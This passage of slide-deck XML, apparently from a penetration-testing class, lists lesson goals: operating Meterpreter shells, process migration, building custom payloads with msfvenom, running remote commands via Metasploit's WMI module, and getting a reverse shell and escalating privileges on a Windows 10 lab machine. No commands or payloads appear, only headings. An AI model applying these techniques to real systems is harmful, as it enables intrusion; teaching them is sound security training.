              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Operate Meterpreter shells.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419" name="Google Shape;419;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1287175" y="2456025"/>
            <a:ext cx="7204500" cy="400200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Perform and explain how process migration works.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420" name="Google Shape;420;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="554850"/>
            <a:ext cx="9168600" cy="3231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By the end of today’s class, you will be able to:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>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424" name="Shape 424"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425" name="Google Shape;425;p62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2541900"/>
            <a:ext cx="9144000" cy="7407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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Intro to msfvenom</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="426" name="Google Shape;426;p62"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix amt="12000"/>
          </a:blip>
          <a:srcRect b="21874" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6504875" y="3069475"/>
            <a:ext cx="2639125" cy="2074025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="427" name="Google Shape;427;p62"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4218608" y="1840596"/>
            <a:ext cx="706789" cy="805738"/>
            <a:chOff x="1564800" y="297975"/>
            <a:chExt cx="4490400" cy="5119050"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="428" name="Google Shape;428;p62"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1564800" y="297975"/>
              <a:ext cx="4490400" cy="5119050"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="204762" w="179616">
                  <a:moveTo>
                    <a:pt x="128126" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="179615" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179615" y="114555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179615" y="114555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179615" y="121340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178817" y="127727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178019" y="134113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176821" y="139701"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175225" y="145289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173229" y="150478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170834" y="155267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168439" y="160057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="166044" y="164448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162851" y="168439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160057" y="172031"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156864" y="175624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153272" y="178817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149679" y="182010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142495" y="187598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134911" y="191989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127327" y="195581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119744" y="198774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112559" y="200770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105774" y="202765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99387" y="203564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94199" y="204362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89808" y="204761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89808" y="204761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85417" y="204362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80229" y="203564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73842" y="202765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="67057" y="200770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59872" y="198774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52289" y="195581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44705" y="191989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37121" y="187598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29937" y="182010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26344" y="178817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23151" y="175624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19559" y="172031"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16765" y="168439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="164448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11177" y="160057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8782" y="155267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6387" y="150478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4391" y="145289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2795" y="139701"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1597" y="134113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="799" y="127727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="121340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="114555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51490" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51490" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128126" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128126" y="1"/>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62"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2013850" y="737050"/>
              <a:ext cx="3612275" cy="3512475"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="140499" w="144491">
                  <a:moveTo>
                    <a:pt x="72245" y="104176"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="93799" y="104176"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93799" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93799" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113756" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113756" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129323" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129323" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="130121" y="140099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="131717" y="138902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134112" y="136507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136906" y="132516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138503" y="129722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="139700" y="126528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141297" y="123335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142095" y="118945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143293" y="114554"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144091" y="109365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="103378"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113756" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72245" y="25545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="103378"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="399" y="109365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1198" y="114554"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2395" y="118945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3593" y="123335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4790" y="126528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5987" y="129722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7584" y="132516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10378" y="136507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12773" y="138902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14369" y="140099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15168" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50691" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50691" y="104176"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72245" y="104176"/>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3" name="Shape 433"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="434" name="Google Shape;434;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="336051" y="95725"/>
            <a:ext cx="8228400" cy="3936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a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Intro to </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en" sz="2800">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="435" name="Google Shape;435;p63"/>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436" name="Google Shape;436;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6104401" y="3760700"/>
            <a:ext cx="2173800" cy="914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b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>We</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>’ll learn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>about custom payloads and</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437" name="Google Shape;437;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="655775" y="927175"/>
            <a:ext cx="3641700" cy="708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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>We used</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>the WMI module in Metasploit to run commands remotely on the Windows 10 machine.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438" name="Google Shape;438;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4896215" y="927100"/>
            <a:ext cx="3060300" cy="708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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>We’ll establish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>a reverse shell on the WIN10 machine, then escalate our privileges.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="439" name="Google Shape;439;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3281026" y="2599138"/>
            <a:ext cx="2578500" cy="759300"/>
          </a:xfrm>
          <a:prstGeom prst="homePlate">
            <a:avLst>
              <a:gd fmla="val 0" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>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63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="655776" y="2599138"/>
            <a:ext cx="2578500" cy="759300"/>
          </a:xfrm>
          <a:prstGeom prst="homePlate">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent3"/>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441" name="Google Shape;441;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143125" y="2760275"/>
            <a:ext cx="1910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lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Previous lesson</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442" name="Google Shape;442;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738145" y="2760267"/>
            <a:ext cx="1667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2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Today</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="443" name="Google Shape;443;p63"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2021213" y="2617238"/>
            <a:ext cx="0" cy="142500"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="lt1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="oval"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="444" name="Google Shape;444;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5909719" y="2599138"/>
            <a:ext cx="2578500" cy="759300"/>
          </a:xfrm>
          <a:prstGeom prst="homePlate">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>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63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6288920" y="2760267"/>
            <a:ext cx="1667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2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>First</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="446" name="Google Shape;446;p63"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7122775" y="3339925"/>
            <a:ext cx="0" cy="291600"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="447" name="Google Shape;447;p63"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4570263" y="2106338"/>
            <a:ext cx="0" cy="653400"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="oval"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="448" name="Google Shape;448;p63"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7122763" y="3178888"/>
            <a:ext cx="0" cy="161100"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="oval"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="449" name="Google Shape;449;p63"/>
